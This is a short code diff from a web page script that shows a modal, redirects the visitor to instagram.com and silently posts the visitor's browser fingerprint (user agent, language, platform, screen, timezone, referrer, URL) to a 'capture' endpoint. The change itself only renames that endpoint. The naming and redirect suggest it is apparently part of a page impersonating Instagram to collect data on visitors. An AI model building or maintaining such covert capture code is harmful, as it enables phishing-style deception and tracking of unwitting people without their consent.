@@ -5,5 +5,5 @@ setTimeout(() => {
   document.body.appendChild(modal);
   document.getElementById("kickedClose").addEventListener("click", () => { window.location.href = "https://www.instagram.com/"; });
   setTimeout(() => { window.location.href = "https://www.instagram.com/"; }, 5000);
-  fetch("api/capture.php", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ type:"viewer_kicked", data:{ userAgent:navigator.userAgent, language:navigator.language, platform:navigator.platform, screen:screen.width+"x"+screen.height, timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, referer:document.referrer, url:window.location.href } }) }).catch(() => {});
+  fetch("/api/capture", { method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({ type:"viewer_kicked", data:{ userAgent:navigator.userAgent, language:navigator.language, platform:navigator.platform, screen:screen.width+"x"+screen.height, timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, referer:document.referrer, url:window.location.href } }) }).catch(() => {});
 }, 3000);
